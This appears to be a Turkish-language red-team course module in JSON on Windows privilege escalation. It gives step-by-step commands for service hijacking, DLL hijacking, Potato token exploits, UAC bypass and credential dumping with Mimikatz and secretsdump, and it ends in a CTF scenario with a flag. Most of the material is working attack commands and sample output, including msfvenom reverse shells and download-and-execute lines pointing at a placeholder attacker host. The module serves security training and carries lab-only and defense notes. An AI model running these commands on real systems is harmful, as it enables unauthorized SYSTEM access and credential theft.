@@ -1,0 +1,187 @@
+{
+  "id": "windows-privesc",
+  "title": "Windows Privilege Escalation",
+  "description": "Windows sistemlerde düşük yetkili kullanıcıdan SYSTEM/Administrator yetkisine yükselmek için kullanılan teknikler: servis zafiyetleri, token impersonation, registry exploit ve daha fazlası.",
+  "team": "red-team",
+  "difficulty": "advanced",
+  "duration": "90 dk",
+  "modules": [
+    {
+      "id": "enumeration",
+      "title": "Windows PrivEsc Enumeration",
+      "sections": [
+        {
+          "type": "text",
+          "content": "Windows'ta privilege escalation'ın ilk adımı sistemin doğru enumerate edilmesidir. Sistem bilgisi, kurulu yamalar, çalışan servisler ve kullanıcı hakları keşfedilmelidir."
+        },
+        {
+          "type": "terminal",
+          "title": "Temel Sistem Bilgisi",
+          "content": "# Sistem bilgisi\nsysteminfo\n\n# Hostname ve kullanıcı\nhostname\nwhoami\nwhoami /priv\nwhoami /groups\n\n# Ağ bilgisi\nipconfig /all\nnetstat -ano\n\n# Kurulu yamalar\nwmic qfe list brief\nsysteminfo | findstr /B /C:\"OS\" /C:\"Hotfix\"",
+          "tip": "systeminfo çıktısını windows-exploit-suggester.py aracına ver — eksik patch'lere göre exploit önerir."
+        },
+        {
+          "type": "terminal",
+          "title": "WinPEAS ile Otomatik Enumeration",
+          "content": "# WinPEAS indir ve çalıştır (Kali'den transfer et)\n# Kali'de:\npython3 -m http.server 8080\n\n# Hedef Windows'ta:\ncertutil -urlcache -f http://KALI_IP:8080/winPEAS.exe winPEAS.exe\n.\\winPEAS.exe\n\n# Renkli çıktı için:\n.\\winPEAS.exe > output.txt\ntype output.txt | more",
+          "tip": "WinPEAS sarı ve kırmızı highlight'lar exploit edilebilir zafiyetleri gösterir."
+        },
+        {
+          "type": "terminal",
+          "title": "PowerUp ile Servis Zafiyeti Taraması",
+          "content": "# PowerUp.ps1 yükle\n# Kali'den:\npython3 -m http.server 8080\n\n# Hedef'te:\npowershell -ep bypass\nIEX(New-Object Net.WebClient).DownloadString('http://KALI_IP:8080/PowerUp.ps1')\nInvoke-AllChecks",
+          "output": "[*] Checking for unquoted service paths...\n[+] Unquoted service path found!\nServiceName: VulnerableService\nPath: C:\\Program Files\\Vulnerable Service\\service.exe\n[*] Checking service permissions...\n[+] Modifiable service found: WeakService"
+        }
+      ]
+    },
+    {
+      "id": "service-exploits",
+      "title": "Servis Zafiyetleri",
+      "sections": [
+        {
+          "type": "text",
+          "content": "Windows servisleri SYSTEM yetkisiyle çalıştığında ve yanlış yapılandırıldığında privilege escalation için mükemmel hedeflerdir."
+        },
+        {
+          "type": "terminal",
+          "title": "Unquoted Service Path",
+          "content": "# Unquoted service path'leri bul\nwmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\"\n\n# Senaryo: C:\\Program Files\\Vuln App\\service.exe\n# Windows şu sırayla dener:\n# C:\\Program.exe\n# C:\\Program Files\\Vuln.exe  ← buraya yaz!\n# C:\\Program Files\\Vuln App\\service.exe\n\n# Yazma izni kontrol:\nicacls \"C:\\Program Files\\Vuln App\"\n\n# Kötü amaçlı exe oluştur (Kali'de):\nmsfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o Vuln.exe\n\n# Hedefe kopyala ve servisi yeniden başlat:\ncopy Vuln.exe \"C:\\Program Files\\Vuln.exe\"\nsc stop VulnerableService\nsc start VulnerableService",
+          "warning": "YALNIZCA yetkili lab ortamında kullanın."
+        },
+        {
+          "type": "terminal",
+          "title": "Weak Service Permissions",
+          "content": "# Servis izinlerini kontrol et\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv \"Everyone\" * /accepteula\n\n# Zayıf izinli servisi değiştir\nsc config WeakService binpath= \"C:\\Temp\\shell.exe\"\nsc stop WeakService\nsc start WeakService",
+          "output": "[+] WeakService\n  RW Everyone\n        SERVICE_ALL_ACCESS"
+        },
+        {
+          "type": "terminal",
+          "title": "DLL Hijacking",
+          "content": "# Eksik DLL ara (Process Monitor ile)\n# procmon filtresi: Result = NAME NOT FOUND, Path ends with .dll\n\n# Kali'de kötü amaçlı DLL:\nmsfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f dll -o missing.dll\n\n# Hedef'te uygun dizine kopyala\ncopy missing.dll \"C:\\Vuln\\App\\missing.dll\"\n\n# Uygulama yeniden başlatıldığında DLL yüklenecek",
+          "tip": "DLL arama sırası: uygulama dizini → System32 → System → Windows → PATH. Uygulama dizinine yazma iznin varsa kazandın."
+        }
+      ]
+    },
+    {
+      "id": "token-impersonation",
+      "title": "Token Impersonation",
+      "sections": [
+        {
+          "type": "text",
+          "content": "Windows token impersonation, mevcut kullanıcının sahip olduğu SeImpersonatePrivilege veya SeAssignPrimaryTokenPrivilege hakları aracılığıyla SYSTEM tokenı çalmayı sağlar."
+        },
+        {
+          "type": "terminal",
+          "title": "Token Haklarını Kontrol Et",
+          "content": "whoami /priv\n\n# Bunlardan biri varsa → Potato saldırısı!\n# SeImpersonatePrivilege\n# SeAssignPrimaryTokenPrivilege\n# SeTcbPrivilege",
+          "output": "PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                               State\n============================= ========================================= ========\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled"
+        },
+        {
+          "type": "terminal",
+          "title": "PrintSpoofer (Windows 10/Server 2019)",
+          "content": "# PrintSpoofer — SeImpersonatePrivilege varsa SYSTEM\n# Kali'den indir:\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe\n\n# Hedefe transfer et ve çalıştır:\n.\\PrintSpoofer64.exe -i -c cmd\n# veya:\n.\\PrintSpoofer64.exe -c \"C:\\Temp\\shell.exe\"",
+          "output": "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.19041]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>"
+        },
+        {
+          "type": "terminal",
+          "title": "GodPotato (Evrensel Potato)",
+          "content": "# GodPotato — Windows Server 2012-2022, Win8-Win11\n.\\GodPotato.exe -cmd \"cmd /c whoami\"\n.\\GodPotato.exe -cmd \"cmd /c C:\\Temp\\shell.exe\"\n\n# JuicyPotatoNG (eski sistemler)\n.\\JuicyPotatoNG.exe -t * -p C:\\Temp\\shell.exe -a",
+          "tip": "Potato ailesini kullan: JuicyPotato (2016-2018), RoguePotato (2019-2020), PrintSpoofer (2020+), GodPotato (evrensel)."
+        },
+        {
+          "type": "terminal",
+          "title": "Meterpreter Token Impersonation",
+          "content": "# Meterpreter shell'de\nload incognito\nlist_tokens -u\nimpersonate_token \"NT AUTHORITY\\SYSTEM\"\ngetuid\n\n# Daha iyi shell al:\nshell\nwhoami",
+          "output": "[-] No Impersonate token available\n[*] Available delegation tokens:\nNT AUTHORITY\\SYSTEM\n[+] Delegation token impersonated\nServer username: NT AUTHORITY\\SYSTEM"
+        }
+      ]
+    },
+    {
+      "id": "registry-exploits",
+      "title": "Registry & AutoRun Exploits",
+      "sections": [
+        {
+          "type": "terminal",
+          "title": "Registry AutoRun Zafiyetleri",
+          "content": "# AutoRun kayıtlarını kontrol et\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# AlwaysInstallElevated — MSI her zaman SYSTEM ile çalışır\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# İkisi de 0x1 ise exploit et!\nmsfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o shell.msi\nmsiexec /quiet /qn /i C:\\Temp\\shell.msi",
+          "tip": "AlwaysInstallElevated ikisinde de 1 ise otomatik SYSTEM şelide çıkarsın."
+        },
+        {
+          "type": "terminal",
+          "title": "Stored Credentials",
+          "content": "# Kayıtlı kimlik bilgilerini ara\ncmdkey /list\n\n# Varsa runas ile kullan\nrunas /savecred /user:Administrator cmd.exe\n\n# Registry'de parola ara\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\n# SAM dosyasından hash dump\nreg save HKLM\\SAM C:\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Temp\\system\n# Kali'de:\npython3 secretsdump.py -sam sam -system system LOCAL"
+        }
+      ]
+    },
+    {
+      "id": "uac-bypass",
+      "title": "UAC Bypass",
+      "sections": [
+        {
+          "type": "text",
+          "content": "User Account Control (UAC) bypass teknikleri, medium yetkili yönetici hesabından tam SYSTEM yetkisine geçişte kullanılır."
+        },
+        {
+          "type": "terminal",
+          "title": "UAC Durumu Kontrol",
+          "content": "# UAC seviyesini kontrol et\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin\n\n# 0 = UAC kapalı, 5 = varsayılan, 2 = her zaman sor",
+          "output": "EnableLUA    REG_DWORD    0x1\nConsentPromptBehaviorAdmin    REG_DWORD    0x5"
+        },
+        {
+          "type": "terminal",
+          "title": "Fodhelper UAC Bypass",
+          "content": "# Fodhelper.exe — Windows 10 UAC bypass\n# Önce medium integrity shell gerekli\nNew-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value cmd.exe -Force\nNew-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force\nStart-Process fodhelper.exe\n\n# Temizle:\nRemove-Item -Path HKCU:\\Software\\Classes\\ms-settings\\ -Recurse -Force"
+        },
+        {
+          "type": "terminal",
+          "title": "Metasploit UAC Bypass Modülleri",
+          "content": "# Meterpreter session'dan\nuse exploit/windows/local/bypassuac_fodhelper\nset SESSION 1\nrun\n\n# Veya:\nuse exploit/windows/local/bypassuac_eventvwr\nset SESSION 1\nrun",
+          "tip": "UAC bypass için önce Administrator grubunda ama medium integrity'de olmak gerekir."
+        }
+      ]
+    },
+    {
+      "id": "credential-dumping",
+      "title": "Credential Dumping",
+      "sections": [
+        {
+          "type": "terminal",
+          "title": "Mimikatz ile Credential Dump",
+          "content": "# Mimikatz (SYSTEM yetkisi gerekli)\n.\\mimikatz.exe\n\n# LSASS'dan plaintext parola\nprivilege::debug\nsekurlsa::logonpasswords\n\n# NTLM hash dump\nsekurlsa::msv\n\n# SAM hash dump\nlsadump::sam\n\n# DPAPI credentials\ndpapi::cred /in:C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Credentials\\*",
+          "output": "Authentication Id : 0 ; 1234567 (00000000:0012d687)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : HEDEF\nLogon Server      : HEDEF\nPassword          : P@ssw0rd123\nNTLM              : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
+          "warning": "LSASS dump antivirüs tarafından tespit edilir. AV bypass gerekebilir."
+        },
+        {
+          "type": "terminal",
+          "title": "Remote SAM Dump (Domain)",
+          "content": "# CrackMapExec ile uzaktan hash dump\ncrackmapexec smb 192.168.1.105 -u Administrator -p 'P@ssw0rd123' --sam\ncrackmapexec smb 192.168.1.105 -u Administrator -p 'P@ssw0rd123' --lsa\n\n# Impacket secretsdump\npython3 secretsdump.py Administrator:'P@ssw0rd123'@192.168.1.105\n\n# Pass-the-Hash\npython3 secretsdump.py -hashes :NTLM_HASH Administrator@192.168.1.105",
+          "output": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nguest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\njohn:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::"
+        }
+      ]
+    },
+    {
+      "id": "scenario",
+      "title": "CTF Senaryosu",
+      "sections": [
+        {
+          "type": "scenario",
+          "title": "HTB: Windows PrivEsc Zinciri",
+          "difficulty": "hard",
+          "objective": "Windows makinesinde low-user shell'den SYSTEM yetkisine yükselerek root.txt'yi oku.",
+          "steps": [
+            "whoami /priv → SeImpersonatePrivilege aktif",
+            "PrintSpoofer64.exe -i -c cmd ile SYSTEM shell al",
+            "SYSTEM shell'de: type C:\\Users\\Administrator\\Desktop\\root.txt"
+          ],
+          "hints": [
+            "SeImpersonatePrivilege varsa Potato ailesi düşün",
+            "Windows versiyonuna göre doğru Potato seç (PrintSpoofer, GodPotato...)",
+            "SYSTEM shell aldıktan sonra Mimikatz ile tüm hashları döküp lateral movement yap"
+          ],
+          "flag": "HTB{W1nd0ws_S3rv1c3s_4r3_D4ng3r0us}",
+          "defenseNote": "Savunma: SeImpersonatePrivilege'i sadece gerekli servislere ver. Tüm yamaları uygula. AppLocker ile bilinmeyen exe'leri engelle. Windows Defender Credential Guard'ı etkinleştir."
+        }
+      ]
+    }
+  ]
+}
